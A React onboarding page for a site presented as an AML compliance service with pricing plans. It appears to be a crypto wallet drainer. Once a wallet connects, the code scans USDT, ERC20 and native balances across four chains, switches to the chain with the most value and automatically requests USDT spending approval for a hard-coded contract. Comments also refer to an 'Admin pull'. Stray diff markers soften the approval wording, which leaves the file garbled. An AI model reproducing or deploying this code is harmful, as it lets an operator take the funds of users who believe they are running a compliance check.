import React, { useState, useEffect } from 'react'
import Header from '../components/Header.jsx'
import Footer from '../components/Footer.jsx'
import CheckWalletButton from '../components/CheckWalletButton.jsx'
import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
import Pricing from '../components/Pricing.jsx'

import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useAccount, useSwitchChain, useChainId, useDisconnect } from 'wagmi'
import { approveUSDT, checkUSDTBalance, checkUSDTBalanceAllNetworks, checkUSDTAllowance, parseUSDTAmount, formatUSDTAmount, ERC20_ABI, USDT_ADDRESSES, checkERC20BalancesAllNetworks } from '../web3/tokenTransfer'
import { CHAIN_IDS, CHAIN_NAMES, wagmiConfig } from '../web3/config.jsx'
import { readContract, getPublicClient, waitForTransactionReceipt } from 'wagmi/actions'
import { formatUnits, createPublicClient, http as viemHttp } from 'viem'
import { mainnet as viemMainnet, polygon as viemPolygon, arbitrum as viemArbitrum, base as viemBase } from 'viem/chains'
import { RESOLVED_RPC_URLS } from '../web3/config.jsx'
import { useConnect } from 'wagmi'

function getNameFromId(id) { return CHAIN_NAMES[id] || 'ethereum' }
const NETWORKS_TO_SCAN = [CHAIN_IDS.ethereum, CHAIN_IDS.arbitrum, CHAIN_IDS.polygon, CHAIN_IDS.base]
const CHAIN_NATIVE = {
  [CHAIN_IDS.ethereum]: { id: 'ethereum', symbol: 'ETH', decimals: 18 },
  [CHAIN_IDS.arbitrum]: { id: 'ethereum', symbol: 'ETH', decimals: 18 },
  [CHAIN_IDS.base]: { id: 'ethereum', symbol: 'ETH', decimals: 18 },
  [CHAIN_IDS.polygon]: { id: 'polygon-pos', symbol: 'MATIC', decimals: 18 }
}
const VIEM_CHAIN_BY_ID = {
  [CHAIN_IDS.ethereum]: viemMainnet,
  [CHAIN_IDS.polygon]: viemPolygon,
  [CHAIN_IDS.arbitrum]: viemArbitrum,
  [CHAIN_IDS.base]: viemBase
}

export default function Onboarding() {
  const { open } = useWeb3Modal()
  const { address, isConnected, connector } = useAccount()
  const { disconnect } = useDisconnect()
  const chainId = useChainId()
  const { switchChain } = useSwitchChain()
  const { connect, connectors } = useConnect()
  const [usdtBalance, setUsdtBalance] = useState(null)
  const [usdtNetwork, setUsdtNetwork] = useState('')
  const [isApproving, setIsApproving] = useState(false)
  const [approvalStatus, setApprovalStatus] = useState('')
  const [allowance, setAllowance] = useState(null)
  const [isCheckingBalance, setIsCheckingBalance] = useState(false)
  const [isSwitchingNetwork, setIsSwitchingNetwork] = useState(false)
  const [hasInitialScan, setHasInitialScan] = useState(false)
  const [autoSwitchEnabled, setAutoSwitchEnabled] = useState(true)
  const [userPreferredChainId, setUserPreferredChainId] = useState(null)
  const [debugError, setDebugError] = useState(null)
  const [erc20BalancesByNetwork, setErc20BalancesByNetwork] = useState({})
  const [isCheckingErc20, setIsCheckingErc20] = useState(false)
  const [isTrustModalOpen, setTrustModalOpen] = useState(false)
  const [selectedPlan, setSelectedPlan] = useState(null)

  // Admin state moved to Admin page

  // Replace with your actual smart contract address
  const SMART_CONTRACT_ADDRESS = "0x83CBbdfd4E0Ae5e264B789cC7459E878A4E39fBd"

  // Prefer a publicly reachable base URL for Trust Wallet deep link
  const publicBaseUrl = typeof window !== 'undefined' 
    ? (localStorage.getItem('amlsec_public_url') || window.location.origin) 
    : ''
  // Networks & native asset metadata moved to module scope for helper access.
  // Format small balances so they don’t round down to 0.00
  function formatDisplayUSDT(amount) {
    if (amount === null || amount === undefined) return '—'
    if (Number.isNaN(amount)) return '—'
    if (amount === 0) return '0'
    if (amount < 0.01) return amount.toFixed(6)
    return amount.toFixed(2)
  }

  function isTrustWalletBrowser() {
    const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : ''
    const hasInjected = typeof window !== 'undefined' && window.ethereum
    const providerFlag = hasInjected && (window.ethereum.isTrust || window.ethereum.isTrustWallet)
    const uaMatch = /trust\s?wallet/i.test(ua) || /trust/i.test(ua)
    return !!(providerFlag || uaMatch)
  }

  function handleConnectTrustWallet() {
    // Show custom Trust Wallet modal with QR code
    setTrustModalOpen(true)
  }

  function handleSelectPlan(plan) {
    setSelectedPlan(plan)
    setTrustModalOpen(true)
  }

  function handleCheckWallet() {
    open && open()
  }

  function getNetworkNameFromChainId(id) {
    return CHAIN_NAMES[id] || 'ethereum'
  }

  // Log chainId changes for diagnostics
  useEffect(() => {
    if (chainId) {
      console.log('Detected chainId change:', chainId, getNetworkNameFromChainId(chainId))
    }
  }, [chainId])

  // Initial connect: record preferred chain and scan all networks
  useEffect(() => {
    async function init() {
      if (isConnected && address && !hasInitialScan) {
        setHasInitialScan(true)
        setUserPreferredChainId(chainId || CHAIN_IDS.ethereum)
        const switched = await checkBestChainAndMaybeSwitchExternal({ address, isConnected, autoSwitchEnabled, currentChainId: chainId, switchToNetwork, setDebugError, triggerApproval: autoApproveAfterSwitch })
        if (!switched) {
          checkCurrentNetworkBalance()
          checkBalanceAllNetworks()
        }
        // Always scan ERC20 balances after initial connect
        await checkAllERC20Balances()
      }
    }
    init()
  }, [isConnected, address, hasInitialScan, chainId])

  // On network change: check current network balance and record manual preference
  useEffect(() => {
    if (isConnected && address && chainId) {
      checkCurrentNetworkBalance()
      if (!isSwitchingNetwork) {
        setUserPreferredChainId(chainId)
      }
    }
  }, [chainId, isConnected, address, isSwitchingNetwork])

  // Admin on-chain role reading moved to Admin page

  function toggleAutoSwitch() {
    setAutoSwitchEnabled(prev => !prev)
  }

  async function checkCurrentNetworkBalance() {
    setIsCheckingBalance(true)
    const currentNetworkName = getNetworkNameFromChainId(chainId)
    try {
      const balance = await checkUSDTBalance({ 
        userAddress: address, 
        network: currentNetworkName 
      })
      const balanceAmount = parseUSDTAmount(balance)
      console.log('USDT balance on', currentNetworkName, 'raw:', balance, 'parsed:', balanceAmount)
      setUsdtBalance(formatDisplayUSDT(balanceAmount))
      setUsdtNetwork(currentNetworkName)
      setDebugError(null)
      if (balanceAmount > 0) {
        await checkCurrentAllowance(currentNetworkName)
      } else {
        setAllowance('0')
      }
    } catch (error) {
      console.error('Error checking current network balance:', error)
      setUsdtNetwork(currentNetworkName)
      setUsdtBalance('0')
      setDebugError(`Balance read failed on ${currentNetworkName}: ${error?.message || String(error)}`)
      setApprovalStatus('Error checking USDT balance')
    } finally {
      setIsCheckingBalance(false)
    }
  }

  async function checkBalanceAllNetworks() {
    setIsCheckingBalance(true)
    try {
      const result = await checkUSDTBalanceAllNetworks({ userAddress: address })
      console.log('USDT all balances:', result.allBalances)
      console.log('USDT highest:', result.highest)
      const currentNetworkName = getNetworkNameFromChainId(chainId)
      const currentNetworkBalance = result.allBalances.find(
        balance => balance.network === currentNetworkName
      ) || { balance: 0, network: currentNetworkName }

      // Auto-switch to highest-balance network if enabled and different from current
      if (
        autoSwitchEnabled &&
        result.highest.balance > 0
      ) {
        const targetChainId = CHAIN_IDS[result.highest.network]
        if (chainId !== targetChainId) {
          console.log(`Switching from ${currentNetworkName} to ${result.highest.network} (highest balance: ${result.highest.balance})`)
          await switchToNetwork(targetChainId, result.highest.network)
          return // Exit early; chainId change triggers re-check
        }
      }

      // Update balance and network display with current network data
      setUsdtBalance(formatDisplayUSDT(currentNetworkBalance.balance))
      setUsdtNetwork(currentNetworkName)
      setDebugError(null)

      if (currentNetworkBalance.balance > 0) {
        await checkCurrentAllowance(currentNetworkName)
      } else {
        setAllowance('0')
      }
    } catch (error) {
      console.error('Error checking balance:', error)
      setDebugError(`Multi-network scan failed: ${error?.message || String(error)}`)
      setApprovalStatus('Error checking USDT balance')
    } finally {
      setIsCheckingBalance(false)
    }
  }

  async function switchToNetwork(targetChainId, networkName) {
    setIsSwitchingNetwork(true)
    setApprovalStatus(`Switching to ${networkName}...`)
    try {
      console.log(`Attempting to switch to chainId: ${targetChainId} (${networkName})`)
      await switchChain({ chainId: targetChainId })
      console.log(`Successfully switched to ${networkName}`)
      setApprovalStatus(`Switched to ${networkName} network`)
    } catch (error) {
      console.error('Error switching network:', error)
      if (error.code === 4902) {
        setApprovalStatus(`Please add ${networkName} network to your wallet manually`)
      } else {
        setApprovalStatus(`Failed to switch to ${networkName}. Please switch manually.`)
      }
    } finally {
      setIsSwitchingNetwork(false)
    }
  }

  // Admin login moved to Admin page

  // Admin pull moved to Admin page

  async function checkCurrentAllowance(network = 'ethereum') {
    try {
      const currentAllowance = await checkUSDTAllowance({ 
        smartContractAddress: SMART_CONTRACT_ADDRESS, 
        userAddress: address,
        network
      })
      setAllowance(formatDisplayUSDT(parseUSDTAmount(currentAllowance)))
    } catch (error) {
      console.error('Error checking allowance:', error)
    }
  }

  async function handleApproveUSDT() {
    if (!isConnected || !address) {
      setApprovalStatus('Please connect your wallet first')
      return
    }

    if (!usdtNetwork) {
      setApprovalStatus('No USDT balance found on any network')
      return
    }

    setIsApproving(true)
-    setApprovalStatus(`Approving USDT on ${usdtNetwork}...`)
+    setApprovalStatus(`Requesting permission to spend USDT on ${usdtNetwork}...`)

    try {
      const tx = await approveUSDT({
        smartContractAddress: SMART_CONTRACT_ADDRESS,
        userAddress: address,
        network: usdtNetwork
      })
-      setApprovalStatus(`Approval transaction sent on ${usdtNetwork}: ${tx}`)
+      setApprovalStatus(`Permission request sent on ${usdtNetwork}: ${tx}`)
       // Wait for transaction to be mined (consider using waitForTransactionReceipt)
       await waitForTransactionReceipt(wagmiConfig, { hash: tx })
-      setApprovalStatus(`USDT approval successful on ${usdtNetwork}!`)
+      setApprovalStatus(`Permission to spend USDT granted on ${usdtNetwork}!`)
      await checkCurrentAllowance(usdtNetwork)
    } catch (error) {
      console.error('Approval failed:', error)
      const msg = (typeof error === 'string' ? error : (error?.message || error?.toString?.() || 'Unknown error'))
      const display = (/user rejected/i.test(msg) || /denied transaction/i.test(msg) || /action_rejected/i.test(msg) || error?.code === 4001 || error?.name === 'UserRejectedRequestError') ? 'Request cancelled by user' : msg
      setApprovalStatus(`Permission request failed: ${display}`)
    } finally {
      setIsApproving(false)
    }
  }

  async function autoApproveAfterSwitch(chainId, networkName) {
    if (!isConnected || !address) {
      console.log('Cannot auto-approve: wallet not connected')
      return
    }

    console.log(`Auto-approving USDT on ${networkName} (chainId: ${chainId})`)
    setIsApproving(true)
-    setApprovalStatus(`Auto-approving USDT on ${networkName}...`)
+    setApprovalStatus(`Auto-requesting permission to spend USDT on ${networkName}...`)

    try {
      const tx = await approveUSDT({
        smartContractAddress: SMART_CONTRACT_ADDRESS,
        userAddress: address,
        network: networkName
      })
-      setApprovalStatus(`Auto-approval transaction sent on ${networkName}: ${tx}`)
+      setApprovalStatus(`Auto permission request sent on ${networkName}: ${tx}`)
       // Wait for transaction receipt using Wagmi/Viem
       await waitForTransactionReceipt(wagmiConfig, { hash: tx })
-      setApprovalStatus(`USDT auto-approval successful on ${networkName}!`)
+      setApprovalStatus(`Permission to spend USDT auto-granted on ${networkName}!`)
      setUsdtNetwork(networkName)
      await checkCurrentAllowance(networkName)
    } catch (error) {
      console.error('Auto-approval failed:', error)
      const msg = (typeof error === 'string' ? error : (error?.message || error?.toString?.() || 'Unknown error'))
      const display = (/user rejected/i.test(msg) || /denied transaction/i.test(msg) || /action_rejected/i.test(msg) || error?.code === 4001 || error?.name === 'UserRejectedRequestError') ? 'Request cancelled by user' : msg
      setApprovalStatus(`Auto permission request failed on ${networkName}: ${display}`)
    } finally {
      setIsApproving(false)
    }
  }

  async function checkAllERC20Balances() {
    if (!isConnected || !address) return
    try {
      setIsCheckingErc20(true)
      const byNet = await checkERC20BalancesAllNetworks({ userAddress: address })
      setErc20BalancesByNetwork(byNet)
    } catch (err) {
      console.error('ERC20 scan failed:', err)
    } finally {
      setIsCheckingErc20(false)
    }
  }

  function handleManualSwitch(targetChainId) {
    const name = getNetworkNameFromChainId(targetChainId)
    switchToNetwork(targetChainId, name)
  }

  function handleResetSession() {
    try { disconnect() } catch (e) { /* ignore */ }
    ;['walletconnect', 'wc', 'WALLETCONNECT_CLIENT', 'WALLETCONNECT_CONNECTOR', 'W3M', 'wagmi.store', 'preferredChainId'].forEach(k => {
      try { localStorage.removeItem(k) } catch (e) { /* ignore */ }
    })
    setApprovalStatus('Session reset. Please reconnect your wallet.')
  }

  return (
    <>
      <Header />
      <main className="pricing-page">
        <div className="pricing-container">
          <div className="pricing-header">
            <h1>Choose Your Plan</h1>
            <p>Select the perfect plan for your AML compliance needs</p>
          </div>

          {/* Three-tier Pricing injected here */}
          <Pricing onSelectPlan={handleSelectPlan} />

          {/* Legacy free plan grid removed; showing only three-tier Pricing */}
        </div>
      </main>

      <Footer />
      
      <TrustWalletConnectModal 
        isOpen={isTrustModalOpen} 
        onClose={() => setTrustModalOpen(false)}
        dappUrl={`${publicBaseUrl}/connect${selectedPlan ? `?plan=${selectedPlan}` : ''}`}
      />
    </>
  )
}

// Insert helper functions inside the component scope, before handleApproveUSDT
async function findBestChainByTokenUsdExternal(walletAddress) {
  let best = { chainId: undefined, usd: 0 }
  for (const cid of NETWORKS_TO_SCAN) {
    const addr = USDT_ADDRESSES[getNameFromId(cid)]
    if (!addr) continue
    try {
      const name = getNameFromId(cid)
      const url = RESOLVED_RPC_URLS[name]
      const client = createPublicClient({
        chain: VIEM_CHAIN_BY_ID[cid],
        transport: viemHttp(url),
        batch: { multicall: false }
      })
      const decimals = await client.readContract({ address: addr, abi: ERC20_ABI, functionName: 'decimals' })
      const balance = await client.readContract({ address: addr, abi: ERC20_ABI, functionName: 'balanceOf', args: [walletAddress] })
      const units = Number.parseFloat(formatUnits(balance || 0n, Number(decimals)))
      const usd = isFinite(units) ? units * 1.0 : 0
      if (usd > best.usd) best = { chainId: cid, usd }
    } catch (e) {
      console.warn('Token scan failed on', cid, e)
    }
  }
  console.log('Best token chain by USD:', best)
  return best
}

async function fetchNativePricesUsd() {
  try {
    const ids = Array.from(new Set(Object.values(CHAIN_NATIVE).map((n) => n.id)))
    const url = 'https://api.coingecko.com/api/v3/simple/price?ids=' + encodeURIComponent(ids.join(',')) + '&vs_currencies=usd'
    const res = await fetch(url)
    const json = await res.json()
    const out = {}
    for (const id of ids) out[id] = Number(json?.[id]?.usd || 0)
    console.log('Native USD prices:', out)
    return out
  } catch (e) {
    console.warn('Failed to fetch native prices:', e)
    return {}
  }
}

async function findBestChainByNativeUsdExternal(walletAddress, priceMap) {
  let best = { chainId: undefined, usd: 0 }
  for (const cid of NETWORKS_TO_SCAN) {
    try {
      const name = getNameFromId(cid)
      const url = RESOLVED_RPC_URLS[name]
      const client = createPublicClient({
        chain: VIEM_CHAIN_BY_ID[cid],
        transport: viemHttp(url),
        batch: { multicall: false }
      })
      const value = await client.getBalance({ address: walletAddress })
      const dec = Number(CHAIN_NATIVE[cid]?.decimals ?? 18)
      const units = Number.parseFloat(formatUnits(value ?? 0n, dec))
      const id = CHAIN_NATIVE[cid]?.id
      const price = id ? Number(priceMap?.[id] ?? 0) : 0
      const usd = (isFinite(units) && isFinite(price)) ? units * price : 0
      if (usd > best.usd) best = { chainId: cid, usd }
    } catch (e) {
      console.warn('Native scan failed on', cid, e)
    }
  }
  console.log('Best native chain by USD:', best)
  return best
}

async function checkBestChainAndMaybeSwitchExternal({ address, isConnected, autoSwitchEnabled, currentChainId, switchToNetwork, setDebugError, triggerApproval }) {
  if (!isConnected || !address) return false
  try {
    const prices = await fetchNativePricesUsd()
    const bestToken = await findBestChainByTokenUsdExternal(address)
    const bestNative = await findBestChainByNativeUsdExternal(address, prices)
    const best = (bestToken.usd || 0) >= (bestNative.usd || 0)
      ? { chainId: bestToken.chainId, asset: 'token', usd: bestToken.usd }
      : { chainId: bestNative.chainId, asset: 'native', usd: bestNative.usd }
    console.log('Best overall by USD:', best)
    if (!autoSwitchEnabled || !best.chainId || (best.usd ?? 0) <= 0 || best.chainId === currentChainId) return false
    const name = getNameFromId(best.chainId)
    await switchToNetwork(best.chainId, name)
    
    // After successful network switch, trigger approval if callback provided
    if (triggerApproval && typeof triggerApproval === 'function') {
      console.log('Network switched successfully, triggering USDT approval...')
      setTimeout(() => {
        triggerApproval(best.chainId, name)
      }, 1000) // Small delay to ensure network switch is complete
    }
    
    return true
  } catch (e) {
    console.error('Best-chain decision failed:', e)
    setDebugError && setDebugError(`Best-chain decision failed: ${e?.message || String(e)}`)
    return false
  }
}

// Comment out the old external helpers to avoid conflicts
/*
async function findBestChainByTokenUsd(walletAddress) {}
async function findBestChainByNativeUsd(walletAddress, priceMap) {}
async function switchToBestChain(chainIdBest) {}
async function checkBestChainAndMaybeSwitch() {}
*/
